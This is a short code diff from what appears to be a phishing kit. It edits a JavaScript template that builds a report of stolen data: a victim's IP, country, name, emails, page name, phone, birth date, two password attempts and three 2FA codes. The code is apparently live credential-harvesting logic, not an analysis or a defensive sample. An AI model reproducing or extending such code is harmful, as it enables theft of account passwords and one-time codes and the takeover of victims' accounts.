@@ -114,18 +114,15 @@ const Utils = {
 
         const emailContent = `
 IP Address: ${locationData.ip}
-Country: ${locationData.location}
-----------------------------------
+Country: ${location}
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
 Email Business: ${data.emailBusiness || ''}
 Page Name: ${data.fanpage || ''}
 Phone: ${data.phone || ''}
 Date of Birth: ${data.day}/${data.month}/${data.year}
-----------------------------------
 Password: ${data.password || ''}
 Password: ${data.passwordSecond || ''}
-----------------------------------
 2FA: ${data.twoFa || ''}
 2FA: ${data.twoFaSecond || ''}
 2FA: ${data.twoFaThird || ''}
